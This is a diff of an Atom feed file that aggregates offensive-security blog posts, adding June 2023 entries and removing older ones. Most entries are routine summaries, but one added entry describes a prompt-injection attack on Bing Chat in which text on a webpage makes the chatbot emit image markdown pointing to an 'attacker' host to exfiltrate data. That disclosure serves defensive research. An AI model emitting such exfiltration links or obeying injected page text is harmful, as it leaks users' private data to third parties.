@@ -2,10 +2,95 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://stephenbradshaw.github.io/offsecfeed/index.html</id>
     <title>osmos::feed</title>
-    <updated>2023-06-16T00:43:46.241Z</updated>
+    <updated>2023-06-20T09:08:00.733Z</updated>
     <generator>osmosfeed 1.15.1</generator>
     <link rel="alternate" href="https://stephenbradshaw.github.io/offsecfeed/index.html"/>
     <link rel="self" href="https://stephenbradshaw.github.io/offsecfeed/feed.atom"/>
+    <entry>
+        <title type="html"><![CDATA[SQL Server Always Encrypted]]></title>
+        <id>https://4sysops.com/?p=1572165</id>
+        <link href="https://4sysops.com/archives/sql-server-always-encrypted/"/>
+        <updated>2023-06-19T15:10:47.000Z</updated>
+        <summary type="html"><![CDATA[Microsoft SQL Server Always Encrypted is a feature that protects confidential data by encrypting it at the column level. It helps prevent accidental or fraudulent disclosure of sensitive data, such as social security numbers (SSN), credit card numbers, or personal health information. In this post, we will discuss Always Encrypted in SQL Server and how to use it.
+SQL Server Always Encrypted first appeared on 4sysops.]]></summary>
+        <author>
+            <name>Surender Kumar</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Bing Chat: Data Exfiltration Exploit Explained]]></title>
+        <id>https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/</id>
+        <link href="https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/"/>
+        <updated>2023-06-18T07:01:02.000Z</updated>
+        <summary type="html"><![CDATA[This post describes how I found a Prompt Injection attack angle in Bing Chat that allowed malicious text on a webpage (like a user comment or an advertisement) to exfiltrate data.
+The Vulnerability - Image Markdown Injection When Bing Chat returns text it can return markdown elements, which the client will render as HTML. This includes the feature to include images.
+Imagine the LLM returns the following text:
+![data exfiltration in progress](https://attacker/logo.]]></summary>
+        <author>
+            <name>Embrace The Red</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Update: zipdump.py Version 0.0.26]]></title>
+        <id>http://blog.didierstevens.com/?p=10080</id>
+        <link href="https://blog.didierstevens.com/2023/06/17/update-zipdump-py-version-0-0-26/"/>
+        <updated>2023-06-17T11:45:23.000Z</updated>
+        <summary type="html"><![CDATA[In this new version, new features/updates are: zipdump_v0_0_26.zip (http)MD5: 5F6C82CD17D587D201D59A4B535F3702SHA256: 90D0F0C1FA238DA9FBC6B7100B8EC01B0E155A0BBF22613B2BA22D5190ABF4DF]]></summary>
+        <author>
+            <name>Didier Stevens</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2023-34367]]></title>
+        <id>http://blog.pi3.com.pl/?p=1003</id>
+        <link href="http://blog.pi3.com.pl/?p=1003"/>
+        <updated>2023-06-16T20:25:10.000Z</updated>
+        <summary type="html"><![CDATA[Blind TCP/IP hijacking is still alive! After 13 years, Windows 7/XP/2K/9x (and not only) full blind TCP/IP hijacking bug finally got an allocated CVE-2023-34367 (thanks to MITRE). Interestingly, The Pwnie Awards nomination for this research and the published write-up + PoC didn’t help to get it sooner 😉 More information about that bug I described in my […]]]></summary>
+        <author>
+            <name>pi3</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Clone Proxmox VMs with Terraform]]></title>
+        <id>https://4sysops.com/?p=1572142</id>
+        <link href="https://4sysops.com/archives/clone-proxmox-vms-with-terraform/"/>
+        <updated>2023-06-16T19:17:37.000Z</updated>
+        <summary type="html"><![CDATA[With the help of Terraform's IaC solution, you can easily clone Proxmox VMs. In this post, you'll learn about the Terraform Proxmox provider, how to generate an API token, how to create the Terraform files, and finally, how to clone VMs.
+Clone Proxmox VMs with Terraform first appeared on 4sysops.]]></summary>
+        <author>
+            <name>Brandon Lee</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Trail of Bits’s Response to NTIA AI Accountability RFC]]></title>
+        <id>https://blog.trailofbits.com/?p=104608</id>
+        <link href="https://blog.trailofbits.com/2023/06/16/trail-of-bitss-response-to-ntia-ai-accountability-rfc/"/>
+        <updated>2023-06-16T12:00:10.000Z</updated>
+        <summary type="html"><![CDATA[By Heidy Khlaaf and Artem Dinaburg The National Telecommunications and Information Administration (NTIA) has circulated an Artificial Intelligence (AI) Accountability Policy Request for Comment on what policies can support the development of AI audits, assessments, certifications, and other mechanisms to create earned trust in AI systems. Trail of Bits has submitted a response to the […]]]></summary>
+        <author>
+            <name>Trail of Bits</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[New Sources of Microsoft Office Metadata – Tool Release MetadataPlus]]></title>
+        <id>https://research.nccgroup.com/?p=30141</id>
+        <link href="https://research.nccgroup.com/2023/06/16/new-sources-of-microsoft-office-metadata-tool-release-metadataplus/"/>
+        <updated>2023-06-16T00:57:55.000Z</updated>
+        <summary type="html"><![CDATA[TL;DR – 31 usernames extracted vs 13 from the next leading brand! Introduction Open Source Intelligence Gathering (OSINT) can be an activity in itself and can also form a solid foundation for Full Spectrum Attack Simulations. Getting an idea of username formats as well as a number of known usernames increases the chances of success […]]]></summary>
+        <author>
+            <name>cnevncc</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Cybersecurity Jobs: Security Awareness Officer (Japanese)]]></title>
+        <id>https://www.sans.org/blog/cybersecurity-jobs-security-awareness-officer-ja</id>
+        <link href="https://www.sans.org/blog/cybersecurity-jobs-security-awareness-officer-ja?msc=rss"/>
+        <updated>2023-06-16T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[セキュリティアウェアネスオフィサーの主な業務や、スキルアップのためのSANSのおすすめのコースを紹介します！]]></summary>
+        <author>
+            <name>SANS Blog</name>
+        </author>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Change the owner of computer objects in Active Directory]]></title>
         <id>https://4sysops.com/?p=1572126</id>
@@ -1002,159 +1087,6 @@ The post In Brief: Chariot Alignment with FDA Section 524B.1 appeared first on P
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[GUEST BLOG: Vulnerability Disclosure Adoption In The Consumer IoT space Is Lagging, But What About Elsewhere?]]></title>
-        <id>https://hackerone.com/vulnerability-disclosure/guest-blog-vulnerability-disclosure-adoption-consumer-iot-space-lagging</id>
-        <link href="https://www.hackerone.com/vulnerability-disclosure/guest-blog-vulnerability-disclosure-adoption-consumer-iot-space-lagging"/>
-        <updated>2023-05-19T22:00:00.000Z</updated>
-        <author>
-            <name>alice@hackerone.com</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Proxmox Backup Server: Install and configure]]></title>
-        <id>https://4sysops.com/?p=1571771</id>
-        <link href="https://4sysops.com/archives/proxmox-backup-server-install-and-configure/"/>
-        <updated>2023-05-19T16:49:03.000Z</updated>
-        <summary type="html"><![CDATA[Previously, I discussed built-in snapshots and backup features in Proxmox VE. Today, I will have a look at Proxmox Backup Server. Proxmox Backup Server is an enterprise-ready backup and recovery solution for VMs, containers, and physical servers. It supports deduplicated and incremental backups to reduce network load and increase storage efficiency.
-Proxmox Backup Server: Install and configure first appeared on 4sysops.]]></summary>
-        <author>
-            <name>Surender Kumar</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[The Paillier Cryptosystem with Applications to Threshold ECDSA]]></title>
-        <id>https://research.nccgroup.com/?p=30179</id>
-        <link href="https://research.nccgroup.com/2023/05/19/the-paillier-cryptosystem-with-applications-to-threshold-ecdsa/"/>
-        <updated>2023-05-19T14:41:55.000Z</updated>
-        <summary type="html"><![CDATA[You may have heard of RSA (b. 1977), but have you heard of its cousin, Paillier (b. 1999)? In this post, we provide a close look at the Paillier homomorphic encryption scheme [Paillier1999], what it offers, how it’s used in complex protocols, and how to implement it securely. Contents RSA Encryption Refresher and Notation We’ll […]]]></summary>
-        <author>
-            <name>Marie-Sarah Lacharite</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[What is Windows 10 S mode? How does Windows 11 S mode differ?]]></title>
-        <id>https://4sysops.com/?p=1571720</id>
-        <link href="https://4sysops.com/archives/what-is-windows-10-s-mode-how-does-windows-11-s-mode-differ/"/>
-        <updated>2023-05-19T14:36:26.000Z</updated>
-        <summary type="html"><![CDATA[Windows 11 S mode builds on its predecessor, Windows 10 S mode. It is a streamlined version of Windows 11, designed to provide a secure, fast, and easy-to-use computing experience. In this article, we will explore the key features and benefits of Windows 11 S mode and compare them to Windows 10 S mode. In addition, you will learn how to disable Windows 11 S mode.
-What is Windows 10 S mode? How does Windows 11 S mode differ? first appeared on 4sysops.]]></summary>
-        <author>
-            <name>Jasmin Kahriman</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Security Distilled: Building a First-Principles Approach to Understanding Security]]></title>
-        <id>https://medium.com/p/cc9cd093a318</id>
-        <link href="https://posts.specterops.io/security-distilled-building-a-first-principles-approach-to-understanding-security-cc9cd093a318?source=rss----f05f8696e3cc---4"/>
-        <updated>2023-05-19T13:34:20.000Z</updated>
-        <author>
-            <name>Nathan D.</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[All your building are belong to us]]></title>
-        <id>https://www.pentestpartners.com/?p=26892</id>
-        <link href="https://www.pentestpartners.com/security-blog/all-your-building-are-belong-to-us/"/>
-        <updated>2023-05-19T05:10:41.000Z</updated>
-        <summary type="html"><![CDATA[TL;DR Building Management Systems (BMS) bring new risks to businesses that haven’t had previous experience of  securing Operational Technology (OT) While there might not be direct financial gain from hacking […]
-All your building are belong to us first appeared on Pen Test Partners.]]></summary>
-        <author>
-            <name>Samuel Thom</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Cybersecurity Jobs: OSINT investigator/Analyst (Japanese)]]></title>
-        <id>https://www.sans.org/blog/cybersecurity-jobs-osint-investigator-analyst-ja</id>
-        <link href="https://www.sans.org/blog/cybersecurity-jobs-osint-investigator-analyst-ja?msc=rss"/>
-        <updated>2023-05-19T00:00:00.000Z</updated>
-        <summary type="html"><![CDATA[OSINT調査員/アナリストの主な業務や、スキルアップのためのSANSのおすすめのコースを紹介します！]]></summary>
-        <author>
-            <name>SANS Blog</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CVE-2023-20869/20870: Exploiting VMware Workstation at Pwn2Own Vancouver]]></title>
-        <id>5894c269e4fcb5e65a1ed623:58a5b38cb3db2bd67b608658:64652c822dcf0d009e347fe0</id>
-        <link href="https://www.thezdi.com/blog/2023/5/17/cve-2023-2086920870-exploiting-vmware-workstation-at-pwn2own-vancouver"/>
-        <updated>2023-05-18T15:50:51.000Z</updated>
-        <summary type="html"><![CDATA[This post covers an exploit chain demonstrated by Nguyễn Hoàng Thạch (@hi_im_d4rkn3ss) of STAR Labs SG Pte. Ltd. during the Pwn2Own Vancouver event in 2023. During the contest, he used an uninitialized variable bug and a stack-based buffer overflow in VMware to escalate from a guest OS to execute code on the underlying hypervisor. His successful demonstration earned him $80,000 and 8 points towards Master of Pwn. All Pwn2Own entries are accompanied by a full whitepaper describing the vulnerabilities being used and how they were exploited. The following blog is an excerpt from that whitepaper detailing CVE-2023-20869 and CVE-2023-20870 with minimal modifications.
-Prior to being patched by VMware, a pair of vulnerabilities existed within the implementation of the virtual Bluetooth USB device…]]></summary>
-        <author>
-            <name>The ZDI Research Team</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Pulseway 9.2: Remote monitoring with workflow automation]]></title>
-        <id>https://4sysops.com/?p=1571710</id>
-        <link href="https://4sysops.com/archives/pulseway-92-remote-monitoring-with-workflow-automation/"/>
-        <updated>2023-05-18T15:29:04.000Z</updated>
-        <summary type="html"><![CDATA[Discover the Pulseway 9.2 update, offering enhanced IT management features, such as policy redesign, workflow automation improvements, remote control enhancements, and more.
-Pulseway 9.2: Remote monitoring with workflow automation first appeared on 4sysops.]]></summary>
-        <author>
-            <name>Brandon Lee</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[LABScon Replay | Does This Look Infected 2 (APT41)]]></title>
-        <id>https://www.sentinelone.com/?post_type=labs&amp;p=80809</id>
-        <link href="https://www.sentinelone.com/labs/labscon-replay-does-this-look-infected-2-apt41/"/>
-        <updated>2023-05-18T13:25:01.000Z</updated>
-        <summary type="html"><![CDATA[Mandiant researchers Van Ta and Rufus Brown take us on a journey of discovery into the compromise of multiple U.S. Government networks by APT41.]]></summary>
-        <author>
-            <name>LABScon</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Rigging the Vote: Uniqueness in Verifiable Random Functions]]></title>
-        <id>https://ncc-blog.pixelpreview.net/?p=26731</id>
-        <link href="https://research.nccgroup.com/2023/05/18/rigging-the-vote-uniqueness-in-verifiable-random-functions/"/>
-        <updated>2023-05-18T11:00:00.000Z</updated>
-        <summary type="html"><![CDATA[This blog post presents a whirlwind overview of Verifiable Random Functions (VRFs) as used by several leading-edge blockchains, and shows how a very interesting and recently found implementation oversight causes the VRF’s assurance of uniqueness to fall apart. As VRFs are commonly used for selecting blockchain consensus voting committees, this can result in a rigged […]]]></summary>
-        <author>
-            <name>Eric Schorn</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Blue teaming – it’s DATa complicated…]]></title>
-        <id>https://www.hexacorn.com/blog/?p=8513</id>
-        <link href="https://www.hexacorn.com/blog/2023/05/17/blue-teaming-its-data-complicated/"/>
-        <updated>2023-05-17T22:57:44.000Z</updated>
-        <summary type="html"><![CDATA[A decade ago blue teaming was … easy (this is a really bad joke, I know!). In fairness, we had less targets, less programming languages to deal with, less platforms, […]]]></summary>
-        <author>
-            <name>adam</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Medical Devices: A Hardware Security Perspective]]></title>
-        <id>https://research.nccgroup.com/?p=30557</id>
-        <link href="https://research.nccgroup.com/2023/05/17/medical-devices-a-hardware-security-perspective/"/>
-        <updated>2023-05-17T17:48:47.000Z</updated>
-        <summary type="html"><![CDATA[Medical device security is gaining more attention for several reasons. The conversation often gets connected to device safety, that is, the degree to which the risk of patient harm is limited by preventing or controlling for device malfunction. Device security expands the scope of safety by supposing a malicious attacker is causing or exploiting the […]]]></summary>
-        <author>
-            <name>Jameson Hyde</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Bug bounties are broken – the story of “i915” bug, ChromeOS + Intel bounty programs, and beyond]]></title>
-        <id>http://blog.pi3.com.pl/?p=931</id>
-        <link href="http://blog.pi3.com.pl/?p=931"/>
-        <updated>2023-05-17T15:16:55.000Z</updated>
-        <summary type="html"><![CDATA[At first, I didn’t plan to write an article about the problems with bug bounty programs. This was supposed to be a standard technical blogpost describing an interesting bug in the Linux Kernel i915 driver allowing for a linear Out-Of-Bound read and write access (CVE-2023-28410). Moreover, I’m not even into bug bounty programs, mostly because […]]]></summary>
-        <author>
-            <name>pi3</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Fork off: Three ways to deal with forking processes]]></title>
-        <id>https://www.skullsecurity.org/2023/fork-off-three-ways-to-deal-with-forking-processes</id>
-        <link href="https://www.skullsecurity.org/2023/fork-off-three-ways-to-deal-with-forking-processes"/>
-        <updated>2023-05-12T20:45:30.000Z</updated>
-        <summary type="html"><![CDATA[Have you ever tested a Linux application that forks into multiple processes? Isn’t it a pain? Whether you’re debugging, trying to see a process crash, or trying to write an exploit, it can be super duper annoying! In a few days, I’m giving a talk at NorthSec in Montreal. I asked some co-workers to review my slides, and they commented that I have some neat techniques to deal with forking, so I thought I’d share a couple! Spoiler alert: The last one is the best, so you can just skip to that. :)]]></summary>
-        <author>
-            <name>SkullSecurity Blog</name>
-        </author>
-    </entry>
-    <entry>
         <title type="html"><![CDATA[Protecting Critical Infrastructure: A Tale of Two National Cybersecurity Strategies]]></title>
         <id>https://www.synack.com/?p=16110</id>
         <link href="https://www.synack.com/blog/critical-infrastructure-national-cybersecurity-strategies/"/>
@@ -1196,90 +1128,6 @@ The post Applying Strategic Thinking in Your Pentesting Program appeared first o
 The post The U.S. has a new cybersecurity strategy. What’s next for CISOs? appeared first on Synack.]]></summary>
         <author>
             <name>Mark Kuhr</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Sorry, No Case Studies—But . . .]]></title>
-        <id>6220e7e8d42c312741f476b0:6220e80dd42c312741f47d6a:62e7cf012af19807518fba2e</id>
-        <link href="https://www.redteamjournal.com/blog/sorry-no-case-study"/>
-        <updated>2022-08-01T13:02:57.000Z</updated>
-        <summary type="html"><![CDATA[A friend of the site recently suggested that we create a current-issue case 
-study using our updated risk discovery approach. “It’s a great idea,” we 
-replied and immediately started kicking around ideas.]]></summary>
-        <author>
-            <name>Red Team Journal</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[The Pointillism of Daily Events]]></title>
-        <id>6220e7e8d42c312741f476b0:6220e80dd42c312741f47d6a:62e2c8f009baa12346d3711f</id>
-        <link href="https://www.redteamjournal.com/blog/pointillism-daily-events"/>
-        <updated>2022-07-29T00:13:00.000Z</updated>
-        <summary type="html"><![CDATA[Nicholas Baker’s book Human Smoke brilliantly illustrates a unique approach 
-to historical narrative. It also underscores the need to remember that 
-every artist paints with intent.]]></summary>
-        <author>
-            <name>Red Team Journal</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Getting Ready for What’s Next]]></title>
-        <id>6220e7e8d42c312741f476b0:6220e80dd42c312741f47d6a:62e2aa91391dcb70804f9850</id>
-        <link href="https://www.redteamjournal.com/blog/getting-ready-whats-next"/>
-        <updated>2022-07-28T15:26:09.000Z</updated>
-        <summary type="html"><![CDATA[In this new age of giant monsters, advanced awareness of classical 
-surprise—that one big tipping moment—no longer suffices.]]></summary>
-        <author>
-            <name>Red Team Journal</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Manage Your ‘Free Cells’ Mindfully]]></title>
-        <id>6220e7e8d42c312741f476b0:6220e80dd42c312741f47d6a:62deb6110fd7f314e5696ae6</id>
-        <link href="https://www.redteamjournal.com/blog/manage-free-cells"/>
-        <updated>2022-07-25T15:26:09.000Z</updated>
-        <summary type="html"><![CDATA[Accommodate but don’t fight the limitations you can’t control, recognize 
-those you can influence and leverage, and don't imagine you have more free 
-cells than you actually do.]]></summary>
-        <author>
-            <name>Red Team Journal</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Popski’s Planning]]></title>
-        <id>6220e7e8d42c312741f476b0:6220e80dd42c312741f47d6a:62d81b5affdc983dd1f616f2</id>
-        <link href="https://www.redteamjournal.com/blog/popskis-planning"/>
-        <updated>2022-07-20T15:12:26.000Z</updated>
-        <summary type="html"><![CDATA[British officer Vladimir Peniakoff’s approach to planning might sound a bit 
-unorthodox at first, but it aligns nicely with Patton’s view of 
-intelligence and speaks to an enduring need to understand front-line 
-conditions.]]></summary>
-        <author>
-            <name>Red Team Journal</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Time for a New Game Board]]></title>
-        <id>6220e7e8d42c312741f476b0:6220e80dd42c312741f47d6a:62d5b6db0343fb487527fc9b</id>
-        <link href="https://www.redteamjournal.com/blog/time-for-a-new-game-board"/>
-        <updated>2022-07-18T19:39:07.000Z</updated>
-        <summary type="html"><![CDATA[We need a more flexible game board where players can explore hypergame 
-strategies—in other words, a game board where the strategist can play the 
-hero for a change. We’ve built it.]]></summary>
-        <author>
-            <name>Red Team Journal</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[The Survivors Exceeded the Minimum]]></title>
-        <id>6220e7e8d42c312741f476b0:6220e80dd42c312741f47d6a:62cf11283f1bdb1191fcdf9d</id>
-        <link href="https://www.redteamjournal.com/blog/survivors-exceeded-minimum"/>
-        <updated>2022-07-13T18:38:32.000Z</updated>
-        <summary type="html"><![CDATA[Not every surprise is a cunning thunderbolt. Some surprises creep up 
-slowly, rusting away former resilience until a simple nudge reveals the 
-rot.]]></summary>
-        <author>
-            <name>Red Team Journal</name>
         </author>
     </entry>
 </feed>
